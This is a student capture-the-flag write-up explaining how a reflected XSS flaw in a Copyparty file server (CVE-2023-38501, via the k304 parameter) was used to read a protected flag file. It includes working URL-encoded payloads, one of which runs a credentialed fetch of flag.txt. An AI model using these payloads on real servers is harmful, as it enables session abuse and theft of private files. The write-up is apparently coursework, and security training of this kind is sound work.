## CTF Week #7 (XSS)


##### Find the file related to the flag on the server. Why can't you directly access the secret flag?

When trying to access the flag.txt file, it shows the following error:

![Image 1](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/CTF7_img1.png)

We cannot directly access the flag because the server is configured to block unauthorized or direct requests to the flag.txt file. It enforces restrictions based on context, such as validating headers, cookies, or the origin of the request. This means the file is protected against simple HTTP GET requests and can only be accessed through interactions that occur within the browser, such as JavaScript execution in the context of an authenticated or authorized session.

To bypass this restriction, an XSS (Cross-Site Scripting) attack can be used. This type of attack exploits vulnerabilities in the web application that allow the injection of malicious JavaScript code. When executed in the context of a user's session, this code can interact with the application as if it were part of the trusted session.

In this scenario, an XSS attack enables the execution of JavaScript to request and retrieve the flag from the server. Since the flag is only accessible via JavaScript running in the browser and direct HTTP requests are blocked, XSS provides a way to exploit client-side vulnerabilities to access restricted resources like flag.txt.


##### This service is popular; it might even have known vulnerabilities. Could those help you access the flag?

As the site is a Copyparty, we did some research on vulnerabilities commonly associated with this type of website. We found that the vulnerability ```CVE-2023-38501``` was particularly relevant. This vulnerability is related to a Stored Cross-Site Scripting (XSS) flaw, which allows attackers to execute malicious JavaScript code by tricking users into accessing a specially crafted link. After searching for an exploit of that vulnerability we decided to add ```/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E``` to the website's link: ```https://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E```.

![Image 2](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/CTF7_img2.png)

This way, we can see that this website is vulnerable, and we can use this exploit to get to the flag.

![Image 3](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/CTF7_img3.png)

After getting the fetch, we encoded the previous url of the attack with the fetch:
```https://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3D%22fetch%28%27https%3A%2F%2Fctf-fsi.fe.up.pt%3A5007%2Fflag.txt%27%2C%7Bcache%3A%27default%27%2Ccredentials%3A%27include%27%2Cmethod%3A%27GET%27%2Cmode%3A%27cors%27%2Credirect%3A%27follow%27%2Creferrer%3A%27https%3A%2F%2Fctf-fsi.fe.up.pt%3A5007%2F%27%2CreferrerPolicy%3A%27strict-origin-when-cross-origin%27%7D%29.then%28response%3D%3Eresponse.text%28%29%29.then%28data%3D%3Econsole.log%28data%29%29.catch%28err%3D%3Econsole.error%28err%29%29%22%3E```

We obtained the flag successfuly!! 

![Image 4](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/CTF7_img4.png)


##### What type of XSS vulnerability (Reflected, Stored, or DOM) allowed you to access the flag?

This vulnerability occurs when user-supplied input, such as a query parameter in a URL, is immediately reflected back by the server into the HTTP response without proper validation or sanitization. In this case, the server reflected the injected payload directly into the response, where it was executed in the browser.

By crafting a malicious URL with a payload (```/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E```), we exploited this flaw to execute JavaScript in the browser. This allowed access to the flag.txt file by making a request within the context of the browser session, which had the required permissions to access the flag.